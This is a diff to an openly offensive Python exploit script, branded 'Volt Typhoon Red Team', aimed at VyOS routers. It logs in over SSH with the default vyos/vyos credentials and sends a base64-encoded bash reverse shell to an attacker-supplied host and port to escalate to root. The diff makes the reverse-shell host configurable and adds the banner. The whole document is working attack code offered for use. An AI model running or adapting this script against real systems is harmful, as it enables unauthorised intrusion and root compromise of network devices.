@@ -1,3 +1,5 @@
+#!/usr/bin/env python3
+
 import base64
 import paramiko
 import time
@@ -7,14 +9,36 @@ RPORT = 22
 USERNAME = 'vyos'
 PASSWORD = 'vyos'
 
-payload_cmd = "bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1"
+ascii_art = r'''
+\.          |\
+   \`.___---~~  ~~~--_
+   //~~----___  (_o_-~
+  '           |/'
+
+__     __    _ _     _____            _                       
+\ \   / /__ | | |_  |_   _|   _ _ __ | |__   ___   ___  _ __  
+ \ \ / / _ \| | __|   | || | | | '_ \| '_ \ / _ \ / _ \| '_ \ 
+  \ V / (_) | | |_    | || |_| | |_) | | | | (_) | (_) | | | |
+   \_/ \___/|_|\__|   |_| \__, | .__/|_| |_|\___/ \___/|_| |_|
+                          |___/|_|                            
+
+              VOLT TYPHOON RED TEAM
+'''
 
 def main():
-    parser = argparse.ArgumentParser(description="VyOS Privilege Escalation Exploit")
-    parser.add_argument("-t", "--target", required=True, help="Target IP address")
-    args = parser.parse_args()
-    RHOST = args.target
+    print(ascii_art)
 
+    parser = argparse.ArgumentParser(description="VyOS Privilege Escalation Exploit - Volt Typhoon Edition")
+    parser.add_argument("-t", "--target", required=True, help="Target IP address")
+    parser.add_argument("-lhost", "--localhost", required=True, help="Localhost IP for reverse shell")
+    parser.add_argument("-lport", "--localport", required=True, help="Local port for reverse shell")
+    args = parser.parse_args()
+
+    RHOST = args.target
+    LHOST = args.localhost
+    LPORT = args.localport
+
+    payload_cmd = f"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"
     payload_b64 = base64.b64encode(payload_cmd.encode()).decode()
 
     ssh = paramiko.SSHClient()
@@ -56,17 +80,15 @@ def main():
     print("[*] Sending privilege escalation payload...")
     chan.send(exploit_cmd)
 
-    time.sleep(3)
-    print("[*] You may now have root shell (try whoami):")
+    print("[*] Payload sent. Check your listener for a reverse shell.")
+    print("[*] Press Ctrl+C to exit.\n")
 
     try:
         while True:
-            resp = chan.recv(1024).decode('utf-8')
-            if resp:
-                print(resp, end='')
-            cmd = input()
-            chan.send(cmd + '\n')
             time.sleep(1)
+            if chan.recv_ready():
+                resp = chan.recv(4096).decode('utf-8')
+                print(resp, end='')
     except KeyboardInterrupt:
         print("\n[*] Exiting.")
     finally:
